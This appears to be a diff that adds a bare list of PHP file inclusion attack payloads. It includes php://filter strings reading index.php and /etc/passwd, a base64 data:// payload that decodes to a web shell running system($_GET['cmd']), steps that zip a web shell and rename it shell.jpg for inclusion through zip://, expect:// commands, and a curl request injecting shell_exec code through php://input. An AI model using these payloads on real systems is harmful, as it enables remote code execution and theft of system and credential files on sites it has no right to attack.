@@ -1,0 +1,24 @@
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+#<?php system($_GET['cmd']) ?>
+
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+
+
+expect://id
+expect://ls
+
+curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
+
+/proc/$PID/fd/$FD
+
